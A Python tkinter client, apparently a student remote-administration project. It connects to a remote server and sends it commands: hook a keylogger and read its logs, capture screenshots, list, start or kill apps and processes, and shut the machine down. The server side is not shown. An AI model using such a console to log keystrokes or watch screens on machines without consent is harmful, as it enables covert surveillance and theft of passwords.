import tkinter as tk
from tkinter import simpledialog,messagebox,filedialog,scrolledtext
import socket
import os
import chardet
import json
from PIL import Image, ImageTk, ImageGrab


# host = "127.0.0.1"
host = ""
port = 65431
timeout = 3
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
isConnected = False

def Quit():
    print("Program Close!")
    isConnected = False
    client_socket.close()
    root.quit()

def connect(user_input):
    global isConnected
    try:
        client_socket.settimeout(timeout)
        client_socket.connect((user_input, port))
        isConnected = True
        print("Connection successful.")
        messagebox.showinfo("Success", "Connection successful!")
    except socket.timeout:
        print("Connection timed out!")
        messagebox.showinfo("Error", "Connection timed out!")
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"Connection failed: {e}")
        messagebox.showinfo("Error", "Connection failed!")

def send_command(command):
    if (isConnected == False):
        messagebox.showinfo("Error", "Connection failed!")
        return
    # client_socket.sendall(command.encode())
    # print(command)
    parts = command.split()
    if parts[0] == "SendKeyStroke":
        Handle_send_keystroke()
    elif parts[0] == "TakeScreenShot":
        Handle_take_screenshot()
    elif parts[0] == "AppRunning":
        Handle_app_running_check()
    elif parts[0] == "ProcessRunning":
        Handle_process_running_check()
    elif parts[0] == "ShutDownComputer":
        Handle_shutdown_computer()
    elif parts[0] == "FixRegistry":
        Handle_fix_registry()

def submit_button_click(event=None):
    user_input = InputTextbox.get()
    print("User input:", user_input)
    connect(user_input)
    InputTextbox.delete(0, tk.END)

#####################################################################
# Send keystroke
def CreateUI_SendKeyStroke():
    def on_closing():
        command = "CLOSE"
        client_socket.sendall(command.encode())
        KeyStrokeRoot.destroy()
    def hook():
        command = "HOOK"
        client_socket.sendall(command.encode())
    def unhook():
        command = "UNHOOK"
        client_socket.sendall(command.encode())
    def print_logs():
        command = "PRINT"
        client_socket.sendall(command.encode())
        file_data = client_socket.recv(1024)
        encoding = chardet.detect(file_data)['encoding']
        log_content = file_data.decode(encoding)
        text_area.delete(1.0, tk.END)
        text_area.insert(tk.END, log_content)

    def delete_logs():
        command = "DELETE"
        client_socket.sendall(command.encode())
        text_area.delete(1.0, tk.END)

    # Create the main window
    KeyStrokeRoot = tk.Tk()
    KeyStrokeRoot.title("Keylogger UI")
    KeyStrokeRoot.geometry("800x600")

    # Create buttons
    hook_button = tk.Button(KeyStrokeRoot, text="Hook", command=hook)
    unhook_button = tk.Button(KeyStrokeRoot, text="Unhook", command=unhook)
    print_button = tk.Button(KeyStrokeRoot, text="Print Logs", command=print_logs)
    delete_button = tk.Button(KeyStrokeRoot, text="Delete Logs", command=delete_logs)

    # Create a scrolled text area
    text_area = scrolledtext.ScrolledText(KeyStrokeRoot, width=70, height=20)
    KeyStrokeRoot.protocol("WM_DELETE_WINDOW", on_closing)
    # Place buttons and text area in the UI
    hook_button.pack(pady=10)
    unhook_button.pack(pady=10)
    print_button.pack(pady=10)
    delete_button.pack(pady=10)
    text_area.pack(pady=20)
    KeyStrokeRoot.mainloop()

def Handle_send_keystroke(): 
    command = "SendKeyStroke"
    client_socket.sendall(command.encode())   
    CreateUI_SendKeyStroke()

#####################################################################
# Screenshot

#1: Open the system's file manager for the user to input the file's name
def SaveImage(image_path):
    image = Image.open(image_path)
    file_path = filedialog.asksaveasfilename(defaultextension=".png", filetypes=[("PNG files", "*.png")])
    
    if file_path:
        image.save(file_path)
        print(f"Image saved to: {file_path}")
    else:
        try:
            os.remove(file_path)
        except OSError as e:
            print(f"Error deleting image: {e}")

#2: Used for updating the picture constantly
def TakePictureButtonFunction():
    ReceiveImage()

    new_image = Image.open("received_image.png")
    new_image = new_image.resize((600, 450), Image.LANCZOS)
    new_photo = ImageTk.PhotoImage(new_image, master=ScreenShotRoot)
    label.config(image=new_photo)
    label.image = new_photo

#3: Create a UI for this feature
def display_image(image_path):
    global ScreenShotRoot
    ScreenShotRoot = tk.Tk()
    ScreenShotRoot.title("Captured Image")
    ScreenShotRoot.geometry("800x600")
    ScreenShotRoot.resizable(False, False)

    image = Image.open(image_path)
    image = image.resize((600, 450), Image.LANCZOS)  # Resize the image using LANCZOS resampling
    photo = ImageTk.PhotoImage(image, master = ScreenShotRoot)
    global label
    label = tk.Label(ScreenShotRoot, image=photo)
    label.pack()

    take_picture_button = tk.Button(ScreenShotRoot, text="Take Picture", command=lambda: TakePictureButtonFunction())
    take_picture_button.pack()

    save_button = tk.Button(ScreenShotRoot, text="Save", command=lambda: SaveImage(image_path))
    save_button.pack()
    ScreenShotRoot.mainloop()

#4: Listen and receive image through TCP connection
def ReceiveImage(image_path="received_image.png"):
    command = "TakeScreenShot"
    client_socket.sendall(command.encode())
    # image_size = int(client_socket.recv(1024).decode())
    picture_size = int(client_socket.recv(1024).decode())
    client_socket.send("ACK".encode())
    received_data = b""
    chunk_size = 1024
    while len(received_data) < picture_size:
        chunk = client_socket.recv(chunk_size)
        received_data += chunk
        client_socket.send("ACK".encode())
    with open(image_path, 'wb') as file:
        file.write(received_data)
    print("Picture received successfully!")
    # file = open(image_path, "wb")
    # isBreak = False
    # while True:
    #     if (isBreak):
    #         break
    #     image_chunk = client_socket.recv(2048)
    #     if (len(image_chunk) < 2048):
    #         isBreak = True
    #     if (len(image_chunk) == 0):
    #         break
    #     file.write(image_chunk)
    # file.close()
    # print("picture received")

#5: main function for this task
def Handle_take_screenshot():
    ReceiveImage()
    display_image("received_image.png")

#####################################################################
# APP RUNNING

def create_AppRunning_UI():
    def on_closing():
        AppRunningRoot.destroy()
        
    def start():
        command = "AppRunning START "
        # client_socket.sendall(command.encode())
        app_name = simpledialog.askstring("Application Name", "Enter the Application Name:")
        if app_name:
            command += str(app_name)
            client_socket.sendall(command.encode())
        message = client_socket.recv(1024).decode()
        if message == "SUCCESS":
            messagebox.showinfo("Success", "Application have been opened.")
        elif message == "FAILED":
            messagebox.showinfo("Failed", "Application not found or could not be opened.")
        
    def kill():
        command = "AppRunning KILL "
        app_id = simpledialog.askinteger("Application ID", "Enter the Application ID:")
        if app_id is not None:
            command += str(app_id)
            client_socket.sendall(command.encode())
            # close_app_by_id(app_id)
        message = client_socket.recv(1024).decode()
        if message == "SUCCESS":
            messagebox.showinfo("Success", "Application have been killed.")
        elif message == "FAILED":
            messagebox.showinfo("Failed", "Application not found or could not be killed.")
        
    def show():
        command = "AppRunning SHOW APP"
        client_socket.sendall(command.encode())
        received_data = client_socket.recv(1024).decode()
        taskbar_app = json.loads(received_data)
        if taskbar_app:
            app_text.delete(1.0, tk.END)
            for app_id, app_title in taskbar_app:
                if len(app_title) > 0:
                    app_text.insert(tk.END, f"ID: {app_id}, Title: {app_title}\n")
                    
    def delete():
        app_text.delete(1.0, tk.END)

    # Create the main window
    AppRunningRoot = tk.Tk()
    AppRunningRoot.title("AppRunning UI")
    AppRunningRoot.geometry("800x600")

    # Create buttons
    start_button = tk.Button(AppRunningRoot, text="Start", command=start)
    kill_button = tk.Button(AppRunningRoot, text="Kill", command=kill)
    show_button = tk.Button(AppRunningRoot, text="Show", command=show)
    delete_button = tk.Button(AppRunningRoot, text="Delete", command=delete)

    app_text = tk.Text(AppRunningRoot)
    app_text.pack(pady=10)

    AppRunningRoot.protocol("WM_DELETE_WINDOW", on_closing)
    # Place buttons and text area in the UI
    start_button.pack(pady=10)
    kill_button.pack(pady=10)
    show_button.pack(pady=10)
    delete_button.pack(pady=10)
    AppRunningRoot.mainloop()
    
# App running 
def Handle_app_running_check():
    create_AppRunning_UI()

#####################################################################
# PROCESS RUNNING

def create_ProcessRunning_UI():
    def on_closing():
        ProcessRunningRoot.destroy()
        
    def start():
        command = "ProcessRunning START "
        process_name = simpledialog.askstring("Process ID", "Enter the Process name:")
        if process_name is not None:
            command += process_name
            client_socket.sendall(command.encode())
        message = client_socket.recv(1024).decode()
        if message == "SUCCESS":
            messagebox.showinfo("Success", "Process have been opened.")
        elif message == "FAILED":
            messagebox.showinfo("Failed", "Process not found or could not be opened.")
        
    def kill():
        command = "ProcessRunning KILL "
        process_id = simpledialog.askinteger("Process ID", "Enter the Process ID:")
        if process_id is not None:
            command += str(process_id)
            client_socket.sendall(command.encode())
        message = client_socket.recv(1024).decode()
        if message == "SUCCESS":
            messagebox.showinfo("Success", "Process have been killed.")
        elif message == "FAILED":
            messagebox.showinfo("Failed", "Process not found or could not be killed.")
        
    def show():
        command = "ProcessRunning SHOW PROCESS"
        client_socket.sendall(command.encode())

        received_data = ""
        while True:
            part = client_socket.recv(1024).decode()
            received_data += part
            if len(part) < 1024:
                # Either 0 or end of data
                break

        client_socket.sendall("ACK".encode())

        taskbar_process = json.loads(received_data)
        if taskbar_process:
            process_text.delete(1.0, tk.END)
            for process_id, process_title in taskbar_process:
                if len(process_title) > 0:
                    process_text.insert(tk.END, f"ID: {process_id}, Title: {process_title}\n")
 
    def delete():
        process_text.delete(1.0, tk.END)
        
    # Create the main window
    ProcessRunningRoot = tk.Tk()
    ProcessRunningRoot.title("ProcessRunning UI")
    ProcessRunningRoot.geometry("800x600")

    # Create buttons
    start_button = tk.Button(ProcessRunningRoot, text="Start", command=start)
    kill_button = tk.Button(ProcessRunningRoot, text="Kill", command=kill)
    show_button = tk.Button(ProcessRunningRoot, text="Show", command=show)
    delete_button = tk.Button(ProcessRunningRoot, text="Delete", command=delete)

    process_text = tk.Text(ProcessRunningRoot)
    process_text.pack(pady=10)

    ProcessRunningRoot.protocol("WM_DELETE_WINDOW", on_closing)
    # Place buttons and text area in the UI
    start_button.pack(pady=10)
    kill_button.pack(pady=10)
    show_button.pack(pady=10)
    delete_button.pack(pady=10)
    ProcessRunningRoot.mainloop()
#Process running
def Handle_process_running_check():
    create_ProcessRunning_UI()

#####################################################################
# Shutdown
def Handle_shutdown_computer():
    command = "ShutDownComputer"
    client_socket.sendall(command.encode())

#####################################################################
# Fix Registry
def Handle_fix_registry():
    pass

#####################################################################
# Building the Client UI
root = tk.Tk()
root.title("Client UI")
root.geometry("650x550")
root.resizable(False, False)

InputMessage = tk.StringVar()
InputMessage.set("")

InputTextbox = tk.Entry(root, width=50, textvariable=InputMessage)
InputTextbox.place(x=35, y=80)
InputTextbox.bind("<Return>", submit_button_click)

SubmitButton = tk.Button(root, text="Connect", width=10, command=submit_button_click)
SubmitButton.place(x=500, y = 75)

ProcessRunningButton = tk.Button(
    root,
    text="Process\nrunning",
    width=10,
    height=16,
    font=("Helvetica", 14, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("ProcessRunning"),
    highlightthickness=2,
)
ProcessRunningButton.place(x=35, y=120)

AppRunningButton = tk.Button(
    root,
    text="App running",
    width=20,
    height=4,
    font=("Helvetica", 14, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("AppRunning"),
    highlightthickness=2,
)
AppRunningButton.place(x=185, y=120)

KeyStrokeButton = tk.Button(
    root,
    text="Keystroke",
    width=12,
    height=11,
    font=("Helvetica", 14, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("SendKeyStroke"),
    highlightthickness=2,
)
KeyStrokeButton.place(x=450, y=120)

ShutDownButton = tk.Button(
    root,
    text="Shut down",
    width=8,
    height=5,
    font=("Helvetica", 15, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("ShutDownComputer"),
    highlightthickness=2,
)
ShutDownButton.place(x=185, y=241)

ScreenShotButton = tk.Button(
    root,
    text="ScreenShot",
    width=10,
    height=5,
    font=("Helvetica", 15, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("TakeScreenShot"),
    highlightthickness=2,
)
ScreenShotButton.place(x=304, y=241)

FixRegistryButton = tk.Button(
    root,
    text="Fixing Registry",
    width=26,
    height=3,
    font=("Helvetica", 15, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("FixRegistry"),
    highlightthickness=2,
)
FixRegistryButton.place(x=185, y=399)

QuitButton = tk.Button(
    root,
    text="Quit",
    width=6,
    height=3,
    font=("Helvetica", 15, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=Quit,
    highlightthickness=2,
)
QuitButton.place(x=522, y=399)

if __name__ == "__main__":
    root.mainloop()
